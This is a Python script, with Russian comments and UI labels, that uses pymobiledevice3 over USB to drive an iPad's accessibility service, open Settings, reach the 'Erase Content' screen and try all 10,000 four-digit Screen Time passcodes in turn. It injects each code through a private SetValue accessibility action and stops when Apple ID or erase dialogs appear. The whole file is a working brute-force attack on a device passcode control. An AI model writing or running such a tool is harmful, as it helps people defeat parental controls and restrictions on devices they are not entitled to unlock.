import asyncio
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.accessibilityaudit import AccessibilityAudit
from pymobiledevice3.services.screenshot import ScreenshotService


async def screenshot(lockdown, path="/tmp/ipad_screen.png"):
    data = await ScreenshotService(lockdown).take_screenshot()
    with open(path, "wb") as f:
        f.write(data)
    return path


def _raw(element):
    return element.element._fields['PlatformElementValue_v1']


async def find_and_press(ax, label: str, timeout: int = 15) -> bool:
    deadline = asyncio.get_event_loop().time() + timeout
    async for el in ax.iter_elements():
        caption = el.caption or ""
        if label.lower() in caption.lower():
            print(f"  → {caption}")
            await ax.perform_press(_raw(el))
            await asyncio.sleep(0.8)
            return True
        if asyncio.get_event_loop().time() > deadline:
            break
    print(f"  Не найдено: {label}")
    return False


async def set_text_field(ax, text: str, timeout: int = 8) -> bool:
    """Найти текстовое поле и установить значение напрямую."""
    deadline = asyncio.get_event_loop().time() + timeout
    async for el in ax.iter_elements():
        caption = el.caption or ""
        if asyncio.get_event_loop().time() > deadline:
            break
        if "Поле" in caption or "Field" in caption or "текст" in caption.lower():
            raw = _raw(el)
            # Построить запрос set value (AXAction-2004)
            element_obj = {
                "ObjectType": "AXAuditElement_v1",
                "Value": {
                    "ObjectType": "passthrough",
                    "Value": {
                        "PlatformElementValue_v1": {"ObjectType": "passthrough"},
                        "Value": raw,
                    },
                },
            }
            action = {
                "ObjectType": "AXAuditElementAttribute_v1",
                "Value": {
                    "ObjectType": "passthrough",
                    "Value": {
                        "AttributeNameValue_v1": {"ObjectType": "passthrough", "Value": "AXAction-2004"},
                        "DisplayAsTree_v1": {"ObjectType": "passthrough", "Value": 0},
                        "HumanReadableNameValue_v1": {"ObjectType": "passthrough", "Value": "SetValue"},
                        "IsInternal_v1": {"ObjectType": "passthrough", "Value": 0},
                        "PerformsActionValue_v1": {"ObjectType": "passthrough", "Value": 1},
                        "SettableValue_v1": {"ObjectType": "passthrough", "Value": 1},
                        "ValueTypeValue_v1": {"ObjectType": "passthrough", "Value": 1},
                        "CurrentValue_v1": {"ObjectType": "passthrough", "Value": text},
                    },
                },
            }
            try:
                await ax._invoke("deviceElement:performAction:withValue:", element_obj, action, 0, expects_reply=False)
                await asyncio.sleep(0.5)
                return True
            except Exception as e:
                print(f"  set_value error: {e}")
                # Fallback: нажать и попробовать печатать по кнопкам клавиатуры
                await ax.perform_press(raw)
                await asyncio.sleep(0.5)
                for ch in text:
                    await find_and_press(ax, ch, timeout=3)
                return True
    return False


async def apple_id_visible(ax) -> bool:
    """Проверить появился ли диалог Apple ID по наличию нужных элементов."""
    keywords = ["apple id", "sign out", "erase", "стереть", "выйти"]
    deadline = asyncio.get_event_loop().time() + 3
    async for el in ax.iter_elements():
        caption = (el.caption or "").lower()
        if any(k in caption for k in keywords):
            return True
        if asyncio.get_event_loop().time() > deadline:
            break
    return False


async def navigate_to_screen_time_input(lockdown, ax):
    import subprocess
    subprocess.run(
        ["python3", "-c", """
import asyncio
from pymobiledevice3.lockdown import create_using_usbmux
async def main():
    ld = await create_using_usbmux()
    from pymobiledevice3.services.springboard import SpringBoardServicesService
    SpringBoardServicesService(ld).launch_application('com.apple.Preferences')
asyncio.run(main())
"""], capture_output=True
    )
    await asyncio.sleep(2)

    await find_and_press(ax, "Основные")
    await asyncio.sleep(1)
    await find_and_press(ax, "Перенос или сброс iPad", timeout=60)
    await asyncio.sleep(1)
    await find_and_press(ax, "Стереть контент", timeout=10)
    await asyncio.sleep(1)
    await find_and_press(ax, "Continue", timeout=10)
    await asyncio.sleep(1)
    print("На экране ввода пароля Screen Time")


async def brute_force(length: int = 4):
    lockdown = await create_using_usbmux()
    print(f"Подключён: {lockdown.product_type} — iOS {lockdown.product_version}")

    async with AccessibilityAudit(lockdown) as ax:
        await navigate_to_screen_time_input(lockdown, ax)

        # Покажем что на экране
        print("\nЭлементы на экране:")
        count = 0
        async for el in ax.iter_elements():
            print(f"  {repr(el.caption)}")
            count += 1
            if count >= 15:
                break

        total = 10 ** length
        for i in range(total):
            code = str(i).zfill(length)
            ok = await set_text_field(ax, code)
            if not ok:
                # Если текстовое поле не нашлось — пробуем по кнопкам клавиатуры
                for ch in code:
                    await find_and_press(ax, ch, timeout=3)
            await asyncio.sleep(0.6)
            result = await apple_id_visible(ax)
            print(f"[{i+1}/{total}] {code} ... {'✓ НАЙДЕН' if result else '✗'}")
            if result:
                print(f"\nПароль Screen Time: {code}")
                return code
            await asyncio.sleep(0.2)

    print("Пароль не найден")
    return None


if __name__ == "__main__":
    asyncio.run(brute_force(length=4))
